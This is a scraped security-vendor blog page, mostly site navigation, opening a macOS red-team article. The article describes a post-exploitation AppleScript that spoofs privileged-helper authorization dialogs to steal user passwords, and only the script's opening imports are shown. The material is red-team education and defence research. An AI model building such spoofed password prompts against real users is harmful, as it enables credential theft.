<li id="menu-item-40015" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-40015"><a href="/global-services/services-overview/">Services</a><div class="mega"><div class="container"><div class="panel"><img src="https://www.sentinelone.com/wp-content/uploads/2021/02/global_services-1.svg" /><div class="blurb">Augment leading technology with trusted expertise, and get set up for success with hands-on support and training.</div><a href="/global-services/services-overview/">Services Overview</a><a href="https://www.sentinelone.com/global-services/get-support-now/" target="">Get Help Now</a><div class="bg"></div></div><div class="menu-wrap-outer"><div class="menu-wrap bp"><div class="subtitle">Global Support & Services</div>
<ul class="sub-menu">
	<li id="menu-item-40017" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-40017"><a href="https://www.sentinelone.com/global-services/vigilance-respond-pro/">Vigilance Respond Pro MDR + DFIR</a><a class="link-wrap" href="https://www.sentinelone.com/global-services/vigilance-respond-pro/"></a><a class="combined d-0" href="https://www.sentinelone.com/global-services/vigilance-respond-pro/"><strong>Vigilance Respond Pro MDR + DFIR</strong> </a><span class="subtitle">24x7 MDR with Full-Scale<br/>Investigation and Response</span><div class="bg"></div></li>
	<li id="menu-item-40018" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-40018"><a href="https://www.sentinelone.com/global-services/vigilance-respond">Vigilance Respond MDR</a><a class="link-wrap" href="https://www.sentinelone.com/global-services/vigilance-respond"></a><a class="combined d-1" href="https://www.sentinelone.com/global-services/vigilance-respond"><strong>Vigilance Respond MDR</strong> </a><span class="subtitle">Dedicated SOC Expertise and Analysis</span><div class="bg"></div></li>
	<li id="menu-item-40019" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-40019"><a href="https://www.sentinelone.com/global-services/watchtower/">WatchTower</a><a class="link-wrap" href="https://www.sentinelone.com/global-services/watchtower/"></a><a class="combined d-2" href="https://www.sentinelone.com/global-services/watchtower/"><strong>WatchTower</strong> </a><span class="subtitle">Intelligence-Driven Threat Hunting</span><div class="bg"></div></li>
	<li id="menu-item-40020" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-40020"><a href="https://www.sentinelone.com/global-services/readiness/">Readiness</a><a class="link-wrap" href="https://www.sentinelone.com/global-services/readiness/"></a><a class="combined d-3" href="https://www.sentinelone.com/global-services/readiness/"><strong>Readiness</strong> </a><span class="subtitle">Best-Practice Deployment and<br/>Quarterly Health Checks</span><div class="bg"></div></li>
	<li id="menu-item-40021" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-40021"><a href="https://www.sentinelone.com/global-services/support-services/">Support Services</a><a class="link-wrap" href="https://www.sentinelone.com/global-services/support-services/"></a><a class="combined d-4" href="https://www.sentinelone.com/global-services/support-services/"><strong>Support Services</strong> </a><span class="subtitle">Tiered Support Options<br/>for Every Organisation</span><div class="bg"></div></li>
	<li id="menu-item-40022" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-40022"><a href="https://www.sentinelone.com/global-services/technical-account-management/">Technical Account Management</a><a class="link-wrap" href="https://www.sentinelone.com/global-services/technical-account-management/"></a><a class="combined d-5" href="https://www.sentinelone.com/global-services/technical-account-management/"><strong>Technical Account Management</strong> </a><span class="subtitle">Customer Success with<br/>Personalised Service </span><div class="bg"></div></li>
	<li id="menu-item-40025" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-40025"><a href="https://www.sentinelone.com/global-services/university/">SentinelOne University</a><a class="link-wrap" href="https://www.sentinelone.com/global-services/university/"></a><a class="combined d-6" href="https://www.sentinelone.com/global-services/university/"><strong>SentinelOne University</strong> </a><span class="subtitle">Live and On-Demand Training</span><div class="bg"></div></li>
</ul>
</div></div></div></div></li>
<li id="menu-item-24944" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-24944"><a href="https://www.sentinelone.com/partners/partner-overview/">Partners</a><div class="mega"><div class="container"><div class="panel"><img src="https://www.sentinelone.com/wp-content/uploads/2021/01/partnertext.svg" /><div class="blurb">See how SentinelOne works with 
trusted names worldwide to enhance 
programs, process, and technology.</div><a href="https://www.sentinelone.com/partners/partner-overview/">Program Overview</a><div class="bg"></div></div><div class="menu-wrap-outer"><div class="menu-wrap bp"><div class="subtitle">OUR NETWORK</div>
<ul class="sub-menu">
	<li id="menu-item-38777" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38777"><a href="https://www.sentinelone.com/partners/singularity-marketplace/">Singularity</a><a class="link-wrap" href="https://www.sentinelone.com/partners/singularity-marketplace/"></a><a class="combined d-0" href="https://www.sentinelone.com/partners/singularity-marketplace/"><strong>Singularity</strong> Marketplace</a><span class="subtitle">Extend the Power of S1 Technology</span><div class="bg"></div></li>
	<li id="menu-item-38780" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38780"><a href="https://www.sentinelone.com/partners/technology-alliance/">Technology</a><a class="link-wrap" href="https://www.sentinelone.com/partners/technology-alliance/"></a><a class="combined d-1" href="https://www.sentinelone.com/partners/technology-alliance/"><strong>Technology</strong> Alliances </a><span class="subtitle">See Integrated, Enterprise-Scale Solutions</span><div class="bg"></div></li>
	<li id="menu-item-24945" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-24945"><a href="https://partners.sentinelone.com/English/">Channel</a><a class="link-wrap" href="https://partners.sentinelone.com/English/"></a><a class="combined d-2" href="https://partners.sentinelone.com/English/"><strong>Channel</strong> Partners</a><span class="subtitle">Deliver the Right Solutions. Together</span><div class="bg"></div></li>
	<li id="menu-item-36742" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36742"><a href="https://www.sentinelone.com/partners/cyber-risk-partners/">Cyber Risk</a><a class="link-wrap" href="https://www.sentinelone.com/partners/cyber-risk-partners/"></a><a class="combined d-3" href="https://www.sentinelone.com/partners/cyber-risk-partners/"><strong>Cyber Risk</strong> Partners</a><span class="subtitle">Enlist Pro Response and Advisory Terms</span><div class="bg"></div></li>
	<li id="menu-item-41076" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41076"><a href="https://www.sentinelone.com/sentinelone-for-aws/">SentinelOne</a><a class="link-wrap" href="https://www.sentinelone.com/sentinelone-for-aws/"></a><a class="combined d-4" href="https://www.sentinelone.com/sentinelone-for-aws/"><strong>SentinelOne</strong> for AWS</a><span class="subtitle">SentinelOne hosted in AWS regions around the world.</span><div class="bg"></div></li>
</ul>
</div></div></div></div></li>
<li id="menu-item-24695" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-24695"><a href="/resources/">Resources</a>
<ul class="sub-menu">
	<li id="menu-item-24696" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-24696"><a href="/resources/category/ebooks/">eBooks</a></li>
	<li id="menu-item-24697" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-24697"><a href="/resources/category/white-paper/">White Papers</a></li>
	<li id="menu-item-24698" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-24698"><a href="/resources/category/datasheet/">Datasheets</a></li>
	<li id="menu-item-24699" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-24699"><a href="/resources/category/case-study/">Case Studies</a></li>
	<li id="menu-item-24700" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-24700"><a href="/resources/category/webinars/">Webinars</a></li>
	<li id="menu-item-24701" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-24701"><a href="/resources/category/video/">Videos</a></li>
	<li id="menu-item-24702" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-24702"><a href="/resources/category/report/">Reports</a></li>
	<li id="menu-item-27940" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-27940"><a href="/events/">Events</a></li>
</ul>
</li>
<li id="menu-item-24852" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-24852"><a href="https://www.sentinelone.com/company/">Company</a>
<ul class="sub-menu">
	<li id="menu-item-24704" class="menu-item menu-item-type-post_type menu-item-object-page current_page_parent menu-item-24704"><a href="https://www.sentinelone.com/blog/">Blog</a></li>
	<li id="menu-item-26985" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-26985"><a href="https://labs.sentinelone.com">Labs</a></li>
	<li id="menu-item-39169" class="menu-item menu-item-type-post_type menu-item-object-landing_page menu-item-39169"><a href="https://www.sentinelone.com/lp/hackchat/">Hack Chat</a></li>
	<li id="menu-item-24705" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-24705"><a href="/press/">Press</a></li>
	<li id="menu-item-30279" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-30279"><a href="/news/">News</a></li>
	<li id="menu-item-32436" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32436"><a href="https://www.sentinelone.com/faq/">FAQ</a></li>
	<li id="menu-item-24853" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-24853"><a href="https://www.sentinelone.com/company/">About Us</a></li>
	<li id="menu-item-24708" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-24708"><a href="/careers/">Careers</a></li>
</ul>
</li>
</ul></div>											</div>
				</div>
				<div class="nav-bg"></div>
								<div class="nav-drawer">
					<div class="upper">
						<div class="toolbar">
							<a class="back"><img src="https://www.sentinelone.com/wp-content/themes/sentinelone/carbine/assets/svg/navigation-arrow-left.svg" /><span>Back</span></a>
							<a class="close"><img src="https://www.sentinelone.com/wp-content/themes/sentinelone/carbine/assets/svg/navigation-close.svg" /></a>
						</div>
						<div class="menu-wrapper">
							<div class="menu-carbine-primary-container"><ul id="menu-carbine-primary-1" class="menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-34979"><a href="https://www.sentinelone.com/platform/">Platform</a><div class="mega"><div class="container"><div class="panel"><img src="https://www.sentinelone.com/wp-content/uploads/2017/06/singularity-white.svg" /><div class="blurb">The SentinelOne platform delivers the defenses you need to prevent, detect, and undo—known and unknown—threats.</div><a href="https://www.sentinelone.com/platform/">Platform Overview</a><a href="https://www.sentinelone.com/platform-packages/" target="">Platform Packages</a><a href="https://www.sentinelone.com/vs/crowdstrike/" target="">SentinelOne vs CrowdStrike</a><div class="bg"></div></div><div class="menu-wrap-outer"><div class="menu-wrap bp6"><div class="subtitle">Platform Products</div>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35909"><a href="https://www.sentinelone.com/platform/singularity-complete/">Singularity</a><a class="link-wrap" href="https://www.sentinelone.com/platform/singularity-complete/"></a><a class="combined d-0" href="https://www.sentinelone.com/platform/singularity-complete/"><strong>Singularity</strong> Complete</a><span class="subtitle">The Future's Enterprise Security Platform</span><div class="bg"></div></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35912"><a href="https://www.sentinelone.com/platform/singularity-control/">Singularity</a><a class="link-wrap" href="https://www.sentinelone.com/platform/singularity-control/"></a><a class="combined d-1" href="https://www.sentinelone.com/platform/singularity-control/"><strong>Singularity</strong> Control</a><span class="subtitle">Security with Suite Features</span><div class="bg"></div></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35913"><a href="https://www.sentinelone.com/platform/singularity-core/">Singularity</a><a class="link-wrap" href="https://www.sentinelone.com/platform/singularity-core/"></a><a class="combined d-2" href="https://www.sentinelone.com/platform/singularity-core/"><strong>Singularity</strong> Core</a><span class="subtitle">Cloud-Native NGAV</span><div class="bg"></div></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41497"><a href="/singularity-xdr/">Singularity</a><a class="link-wrap" href="/singularity-xdr/"></a><a class="combined d-3" href="/singularity-xdr/"><strong>Singularity</strong> XDR</a><span class="subtitle">Extended Detection & Response</span><div class="bg"></div></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35911"><a href="https://www.sentinelone.com/platform/singularity-ranger-iot/">Singularity</a><a class="link-wrap" href="https://www.sentinelone.com/platform/singularity-ranger-iot/"></a><a class="combined d-4" href="https://www.sentinelone.com/platform/singularity-ranger-iot/"><strong>Singularity</strong> Ranger IoT</a><span class="subtitle">Network Visibility & Control</span><div class="bg"></div></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35910"><a href="https://www.sentinelone.com/platform/singularity-cloud/">Singularity</a><a class="link-wrap" href="https://www.sentinelone.com/platform/singularity-cloud/"></a><a class="combined d-5" href="https://www.sentinelone.com/platform/singularity-cloud/"><strong>Singularity</strong> Cloud</a><span class="subtitle">Container & Cloud Workload Security</span><div class="bg"></div></li>
</ul></div><div class="menu-wrap secondary"><div class="subtitle">Platform Verticals</div><ul class="sub-menu">	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-37383"><a href="https://www.sentinelone.com/platform/energy/">Energy</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-37384"><a href="https://www.sentinelone.com/platform/finance/">Finance</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-37387"><a href="https://www.sentinelone.com/platform/healthcare/">Healthcare</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-37385"><a href="https://www.sentinelone.com/platform/highereducation/">Higher Education</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-37386"><a href="https://www.sentinelone.com/platform/retail/">Retail</a></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41084"><a href="https://www.sentinelone.com/platform/manufacturing/">Manufacturing</a></li>
</ul>
</div></div></div></div></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-30696"><a href="https://www.sentinelone.com/customer-page/">Our Customers</a></li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-40015"><a href="/global-services/services-overview/">Services</a><div class="mega"><div class="container"><div class="panel"><img src="https://www.sentinelone.com/wp-content/uploads/2021/02/global_services-1.svg" /><div class="blurb">Augment leading technology with trusted expertise, and get set up for success with hands-on support and training.</div><a href="/global-services/services-overview/">Services Overview</a><a href="https://www.sentinelone.com/global-services/get-support-now/" target="">Get Help Now</a><div class="bg"></div></div><div class="menu-wrap-outer"><div class="menu-wrap bp"><div class="subtitle">Global Support & Services</div>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-40017"><a href="https://www.sentinelone.com/global-services/vigilance-respond-pro/">Vigilance Respond Pro MDR + DFIR</a><a class="link-wrap" href="https://www.sentinelone.com/global-services/vigilance-respond-pro/"></a><a class="combined d-0" href="https://www.sentinelone.com/global-services/vigilance-respond-pro/"><strong>Vigilance Respond Pro MDR + DFIR</strong> </a><span class="subtitle">24x7 MDR with Full-Scale<br/>Investigation and Response</span><div class="bg"></div></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-40018"><a href="https://www.sentinelone.com/global-services/vigilance-respond">Vigilance Respond MDR</a><a class="link-wrap" href="https://www.sentinelone.com/global-services/vigilance-respond"></a><a class="combined d-1" href="https://www.sentinelone.com/global-services/vigilance-respond"><strong>Vigilance Respond MDR</strong> </a><span class="subtitle">Dedicated SOC Expertise and Analysis</span><div class="bg"></div></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-40019"><a href="https://www.sentinelone.com/global-services/watchtower/">WatchTower</a><a class="link-wrap" href="https://www.sentinelone.com/global-services/watchtower/"></a><a class="combined d-2" href="https://www.sentinelone.com/global-services/watchtower/"><strong>WatchTower</strong> </a><span class="subtitle">Intelligence-Driven Threat Hunting</span><div class="bg"></div></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-40020"><a href="https://www.sentinelone.com/global-services/readiness/">Readiness</a><a class="link-wrap" href="https://www.sentinelone.com/global-services/readiness/"></a><a class="combined d-3" href="https://www.sentinelone.com/global-services/readiness/"><strong>Readiness</strong> </a><span class="subtitle">Best-Practice Deployment and<br/>Quarterly Health Checks</span><div class="bg"></div></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-40021"><a href="https://www.sentinelone.com/global-services/support-services/">Support Services</a><a class="link-wrap" href="https://www.sentinelone.com/global-services/support-services/"></a><a class="combined d-4" href="https://www.sentinelone.com/global-services/support-services/"><strong>Support Services</strong> </a><span class="subtitle">Tiered Support Options<br/>for Every Organisation</span><div class="bg"></div></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-40022"><a href="https://www.sentinelone.com/global-services/technical-account-management/">Technical Account Management</a><a class="link-wrap" href="https://www.sentinelone.com/global-services/technical-account-management/"></a><a class="combined d-5" href="https://www.sentinelone.com/global-services/technical-account-management/"><strong>Technical Account Management</strong> </a><span class="subtitle">Customer Success with<br/>Personalised Service </span><div class="bg"></div></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-40025"><a href="https://www.sentinelone.com/global-services/university/">SentinelOne University</a><a class="link-wrap" href="https://www.sentinelone.com/global-services/university/"></a><a class="combined d-6" href="https://www.sentinelone.com/global-services/university/"><strong>SentinelOne University</strong> </a><span class="subtitle">Live and On-Demand Training</span><div class="bg"></div></li>
</ul>
</div></div></div></div></li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-24944"><a href="https://www.sentinelone.com/partners/partner-overview/">Partners</a><div class="mega"><div class="container"><div class="panel"><img src="https://www.sentinelone.com/wp-content/uploads/2021/01/partnertext.svg" /><div class="blurb">See how SentinelOne works with 
trusted names worldwide to enhance 
programs, process, and technology.</div><a href="https://www.sentinelone.com/partners/partner-overview/">Program Overview</a><div class="bg"></div></div><div class="menu-wrap-outer"><div class="menu-wrap bp"><div class="subtitle">OUR NETWORK</div>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38777"><a href="https://www.sentinelone.com/partners/singularity-marketplace/">Singularity</a><a class="link-wrap" href="https://www.sentinelone.com/partners/singularity-marketplace/"></a><a class="combined d-0" href="https://www.sentinelone.com/partners/singularity-marketplace/"><strong>Singularity</strong> Marketplace</a><span class="subtitle">Extend the Power of S1 Technology</span><div class="bg"></div></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38780"><a href="https://www.sentinelone.com/partners/technology-alliance/">Technology</a><a class="link-wrap" href="https://www.sentinelone.com/partners/technology-alliance/"></a><a class="combined d-1" href="https://www.sentinelone.com/partners/technology-alliance/"><strong>Technology</strong> Alliances </a><span class="subtitle">See Integrated, Enterprise-Scale Solutions</span><div class="bg"></div></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-24945"><a href="https://partners.sentinelone.com/English/">Channel</a><a class="link-wrap" href="https://partners.sentinelone.com/English/"></a><a class="combined d-2" href="https://partners.sentinelone.com/English/"><strong>Channel</strong> Partners</a><span class="subtitle">Deliver the Right Solutions. Together</span><div class="bg"></div></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36742"><a href="https://www.sentinelone.com/partners/cyber-risk-partners/">Cyber Risk</a><a class="link-wrap" href="https://www.sentinelone.com/partners/cyber-risk-partners/"></a><a class="combined d-3" href="https://www.sentinelone.com/partners/cyber-risk-partners/"><strong>Cyber Risk</strong> Partners</a><span class="subtitle">Enlist Pro Response and Advisory Terms</span><div class="bg"></div></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41076"><a href="https://www.sentinelone.com/sentinelone-for-aws/">SentinelOne</a><a class="link-wrap" href="https://www.sentinelone.com/sentinelone-for-aws/"></a><a class="combined d-4" href="https://www.sentinelone.com/sentinelone-for-aws/"><strong>SentinelOne</strong> for AWS</a><span class="subtitle">SentinelOne hosted in AWS regions around the world.</span><div class="bg"></div></li>
</ul>
</div></div></div></div></li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-24695"><a href="/resources/">Resources</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-24696"><a href="/resources/category/ebooks/">eBooks</a></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-24697"><a href="/resources/category/white-paper/">White Papers</a></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-24698"><a href="/resources/category/datasheet/">Datasheets</a></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-24699"><a href="/resources/category/case-study/">Case Studies</a></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-24700"><a href="/resources/category/webinars/">Webinars</a></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-24701"><a href="/resources/category/video/">Videos</a></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-24702"><a href="/resources/category/report/">Reports</a></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-27940"><a href="/events/">Events</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-24852"><a href="https://www.sentinelone.com/company/">Company</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page current_page_parent menu-item-24704"><a href="https://www.sentinelone.com/blog/">Blog</a></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-26985"><a href="https://labs.sentinelone.com">Labs</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-landing_page menu-item-39169"><a href="https://www.sentinelone.com/lp/hackchat/">Hack Chat</a></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-24705"><a href="/press/">Press</a></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-30279"><a href="/news/">News</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32436"><a href="https://www.sentinelone.com/faq/">FAQ</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-24853"><a href="https://www.sentinelone.com/company/">About Us</a></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-24708"><a href="/careers/">Careers</a></li>
</ul>
</li>
</ul></div>						</div>
					</div>
					<div class="lower">
						<div class="secondary-links">
							<div class="menu-top-bar-container"><ul id="menu-top-bar-1" class="menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-16921"><a href="#s1phone">1-855-868-3733</a></li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-25727"><a href="/contact/">Contact</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page current_page_parent menu-item-16923"><a href="https://www.sentinelone.com/blog/">Blog</a></li>
</ul></div>							<span class="breach">Experiencing a Breach?</span>
						</div>
						<a class="demo" href="/request-demo/">Get a Demo</a>
					</div>
				</div>
							</div>
		</div>
	</header>
		
	<div class="main  ">
	

<div class="section-wrap header block-0">
	<section class="blog_head" style="">
		<div class="underlay"></div>
		<div class="container">
			<div class="inner">
				<div class="graphic wow fadeIn" data-wow-delay="1s">
					<img src="https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/macOS-Red-Team_-Calling-Apple-APIs-Without-Building-Binaries-7.jpg?lossy=0&strip=1&webp=0" />
				</div>
				<div class="context wow fadeInRight">
					<div class="flourish"></div>
					<div class="heading">
						<h1 class="entry-title">macOS Red Team: Calling Apple APIs Without Building Binaries</h1>					</div>
					<div class="meta">
						<div class="post-meta">
													<a href="https://www.sentinelone.com/blog/2019/12/" rel="bookmark">
								<time datetime="2019-12-05">December 5, 2019</time>
							</a>
																			<div class="author">
								<span>by </span>
								<a href="https://www.sentinelone.com/blog/author/macoswriter/">
									Phil Stokes								</a>
							</div>
												</div>
						<div class="meta-share">
	<div><a class="socicon socicon-facebook" href="http://www.facebook.com/sharer.php?u=https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/" target="_blank"></a></div><div><a class="socicon socicon-twitter" href="https://twitter.com/intent/tweet?url=https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/&#038;text=macOS%20Red%20Team%3A%20Calling%20Apple%20APIs%20Without%20Building%20Binaries" target="_blank"></a></div><div><a class="socicon socicon-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&#038;url=https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/" target="_blank"></a></div><div><a class="socicon socicon-reddit" href="http://reddit.com/submit?url=https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/" target="_blank"></div><div><a class="socicon socicon-mail" href="mailto:?subject=macOS%20Red%20Team%3A%20Calling%20Apple%20APIs%20Without%20Building%20Binaries&#038;body=https%3A%2F%2Fwww.sentinelone.com%2Fblog%2Fmacos-red-team-calling-apple-apis-without-building-binaries%2F"></a></div><div id="share-item-sms"><a class="socicon socicon-sharethis" href="sms:?body=macOS%20Red%20Team%3A%20Calling%20Apple%20APIs%20Without%20Building%20Binaries%20-%20https%3A%2F%2Fwww.sentinelone.com%2Fblog%2Fmacos-red-team-calling-apple-apis-without-building-binaries%2F"></a></div></div>
<script>if ( typeof window.orientation === 'undefined' ) { document.getElementById( 'share-item-sms' ).style.display = "none"; }</script>					</div>
				</div>
			</div>
		</div>
	</section>
</div>

<div class="section-wrap block-1">
	<section class="archive-single-post" style="">
		<div class="container">
			<div class="inner">
				<div class="primary-wrap">
					<div id="primary" class="content-area">
						<div class="primary-inner">
							<article id="post-26227" class="post-26227 post type-post status-publish format-standard has-post-thumbnail hentry category-security tag-macos-security-sentinelone tag-phishing tag-post-exploitation tag-red-team">
								<div class="entry-content">
									
					<table id="amazon-polly-audio-table">
						<tr>
						<td id="amazon-polly-audio-tab">
							<div id="amazon-ai-player-label"></div>
							<div id="amazon-ai-player-container">
			<audio class="amazon-ai-player" id="amazon-ai-player" preload="none" controls   controlsList="nodownload" >
				<source type="audio/mpeg" src="https://s3.us-east-1.amazonaws.com/audio-for-wordpress-45086892059684b045a4189d91d52199e7d604f2/2019/12/amazon_polly_26227.mp3?version=1576472500">
			</audio>
		</div>
							<div id="amazon-polly-subscribe-tab"></div>
							<div id="amazon-polly-by-tab"></div>
						</td>
						</tr>
					</table><p><span style="font-weight: 400;">In the <a href="https://www.sentinelone.com/blog/macos-red-team-spoofing-privileged-helpers-and-others-to-gain-root/" rel="noopener noreferrer" target="_blank">previous post</a> on macOS red teaming, we set out to create a post-exploitation script that could automate searching for privileged apps on a target&#8217;s Mac and generate a convincing-looking authorization request dialog box to steal the user&#8217;s <a href="https://www.sentinelone.com/blog/7-ways-hackers-steal-your-passwords/" rel="noopener noreferrer" target="_blank">password</a>. We also want our script to be able to monitor for use of the associated app so that it can trigger the spoofing attempt at an appropriate time to maximize success. In this post, <span class="marker-animation">we&#8217;ll continue developing our script, explore the wider case for taking an interest in AppleScript from a security angle, and conclude with some notes on mitigation and education.</span></span></p>
<p><img loading="lazy" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/macOS-Red-Team_-Calling-Apple-APIs-Without-Building-Binaries-5.jpg?lossy=0&strip=1&webp=0" alt="image of calling apple apis" width="1200" height="628" class="aligncenter size-full wp-image-26641" srcset="https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/macOS-Red-Team_-Calling-Apple-APIs-Without-Building-Binaries-5.jpg?lossy=0&amp;strip=1&amp;webp=0 1200w, https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/macOS-Red-Team_-Calling-Apple-APIs-Without-Building-Binaries-5-300x157.jpg?lossy=0&amp;strip=1&amp;webp=0 300w, https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/macOS-Red-Team_-Calling-Apple-APIs-Without-Building-Binaries-5-1024x536.jpg?lossy=0&amp;strip=1&amp;webp=0 1024w, https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/macOS-Red-Team_-Calling-Apple-APIs-Without-Building-Binaries-5-768x402.jpg?lossy=0&amp;strip=1&amp;webp=0 768w" sizes="(max-width: 1200px) 100vw, 1200px" /></p>
<p><span style="font-weight: 400;">From last time, we have got as far as enumerating any Privileged Helper Tools, finding their parent applications, grabbing the associated icon and producing a reasonably credible-looking dialog  box. My incomplete version of the script so far looks something like this:</span></p>
<div style="background: #f8f8f8; overflow:scroll;width:auto;height:550px;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;">
<pre style="margin: 0; line-height: 125%"><span style="color: #408080; font-style: italic">#######################</span>
<span style="color: #408080; font-style: italic">--&gt;&gt; IMPORT STATEMENTS</span>
<span style="color: #408080; font-style: italic">#######################</span>

<span style="color: #19177C">use</span> <span style="color: #880000">AppleScript</span> <span style="color: #880000">version</span> <span style="color: #BA2121">&quot;2.4&quot;</span> <span style="color: #408080; font-style: italic">-- Yosemite (10.10) or later</span>
<span style="color: #19177C">use</span> <span style="color: #19177C">scripting</span> <span style="color: #19177C">additions</span>
<span style="color: #19177C">use</span> <span style="color: #19177C">framework</span> <span style="color: #BA2121">&quot;Foundation&quot;</span>

<span style="color: #408080; font-style: italic">#  classes, constants, and enums used</span>
<span style="color: #008000; font-weight: bold">property</span> <span style="color: #19177C">NSString</span> : <span style="color: #19177C">a</span> <span style="color: #AA22FF; font-weight: bold">reference to</span> <span style="color: #880000">current application</span>&#39;s <span style="color: #19177C">NSString</span>
<span style="color: #008000; font-weight: bold">property</span> <span style="color: #19177C">NSFileManager</span> : <span style="color: #19177C">a</span> <span style="color: #AA22FF; font-weight: bold">reference to</span> <span style="color: #880000">current application</span>&#39;s <span style="color: #19177C">NSFileManager</span>
<span style="color: #008000; font-weight: bold">property</span> <span style="color: #19177C">NSWorkspace</span> : <span style="color: #19177C">a</span> <span style="color: #AA22FF; font-weight: bold">reference to</span> <span style="color: #880000">current application</span>&#39;s <span style="color: #19177C">NSWorkspace</span>

<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">NSDirectoryEnumerationSkipsHiddenFiles</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">a</span> <span style="color: #AA22FF; font-weight: bold">reference to</span> <span style="color: #666666">4</span>
